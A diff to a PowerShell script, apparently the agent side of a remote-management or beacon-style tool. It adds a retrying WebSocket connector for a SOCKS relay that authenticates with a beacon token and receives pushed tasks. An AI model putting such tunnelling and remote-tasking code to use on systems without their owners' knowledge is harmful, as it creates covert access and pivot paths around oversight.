@@ -839,7 +839,7 @@ function Get-RmmSocksWsUri {
     } else {
         $wsBase = "ws://$base"
     }
-    return "$wsBase/socks-ws?id=$sessionId"
+    return "$wsBase/socks?id=$sessionId"
 }
 
 function Send-RmmSocksWsJson {
@@ -885,13 +885,42 @@ function Receive-RmmSocksWsJson {
     }
 }
 
-function Invoke-RmmSocksWsRelay {
-    $uri = [Uri](Get-RmmSocksWsUri)
+function Connect-RmmSocksClientWebSocket {
+    param([Uri]$Uri)
     $ws = [System.Net.WebSockets.ClientWebSocket]::new()
     if ($beaconSecret) {
         $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
     }
-    $null = $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()
+    $origin = $u.TrimEnd('/')
+    if ($origin -match '(?i)^https?://') {
+        $ws.Options.SetRequestHeader('Origin', $origin)
+    }
+    $lastErr = $null
+    foreach ($attempt in 1..5) {
+        if ($attempt -gt 1) { Start-Sleep -Milliseconds 400 }
+        try {
+            if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::None) {
+                $ws.Dispose()
+                $ws = [System.Net.WebSockets.ClientWebSocket]::new()
+                if ($beaconSecret) {
+                    $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
+                }
+                if ($origin -match '(?i)^https?://') {
+                    $ws.Options.SetRequestHeader('Origin', $origin)
+                }
+            }
+            $null = $ws.ConnectAsync($Uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()
+            return $ws
+        } catch {
+            $lastErr = $_
+        }
+    }
+    throw $lastErr
+}
+
+function Invoke-RmmSocksWsRelay {
+    $uri = [Uri](Get-RmmSocksWsUri)
+    $ws = Connect-RmmSocksClientWebSocket -Uri $uri
     Write-RmmSocksHostLine '[+] SOCKS WebSocket channel active (push tasks)'
     $headers = Get-RmmRequestHeaders
     $emptyPoll = @{ active = $true; tasks = @() }
@@ -969,6 +998,7 @@ function Get-RmmSocksWorkerFunctionNames {
         'Read-RmmSocksTcpChunk',
         'Invoke-RmmSocksCycle',
         'Get-RmmSocksWsUri',
+        'Connect-RmmSocksClientWebSocket',
         'Send-RmmSocksWsJson',
         'Receive-RmmSocksWsJson',
         'Invoke-RmmSocksWsRelay',
